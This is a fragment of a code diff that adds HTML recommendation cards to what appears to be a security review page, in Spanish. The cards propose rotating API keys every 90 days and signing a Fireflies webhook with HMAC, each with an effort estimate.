+                <div class="reco-title">Rotacion automatica de API keys (expiracion 90 dias)</div>
+                <div class="reco-ref">Reducir ventana de exposicion si una key es comprometida</div>
+            </div>
+            <span class="reco-effort">~3 horas</span>
+        </div>
+
+        <div class="reco-card">
+            <div class="reco-priority p7">7</div>
+            <div class="reco-body">
+                <div class="reco-title">Firma HMAC para webhook Fireflies</div>
+                <div class="reco-ref">Reemplazar API key por firma criptografica</div>
+            </div>
+            <span class="reco-effort">~1 hora</span>
         </div>
     </div>
 
